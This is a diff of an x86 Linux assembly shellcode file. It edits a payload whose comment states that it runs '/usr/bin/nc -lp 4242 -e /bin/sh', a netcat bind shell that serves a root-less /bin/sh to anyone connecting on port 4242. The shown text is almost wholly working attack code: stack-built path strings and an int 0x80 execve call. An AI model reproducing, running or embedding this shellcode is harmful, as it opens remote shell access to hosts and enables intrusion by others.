@@ -1,15 +1,20 @@
-	;; execv("/bin/nc", ["/usr/bin/nc", "-lp", "4242", "-e", "/bin/sh"], NULL)
+	;; execv("/usr/bin/nc", ["/usr/bin/nc", "-lp", "4242", "-e", "/bin/sh"], NULL)
 
 	section .text
 	global _start
 
-	%define SYS_EXECV 11
+    %include "../../../utils_linux_x86.asm"
+
+
 _start:
+    xor eax, eax
+    mov al, 0xff
+    sub esp, eax
 	xor edx,edx
 	push edx
 	push dword '//nc'
 	push dword '/bin'
-	push dword '/usr'
+    push dword '/usr'
 
 	mov ebx, esp
 	push edx
@@ -37,5 +42,3 @@ _start:
 	xor eax,eax
 	mov al,SYS_EXECV
 	int 0x80
-	
-	
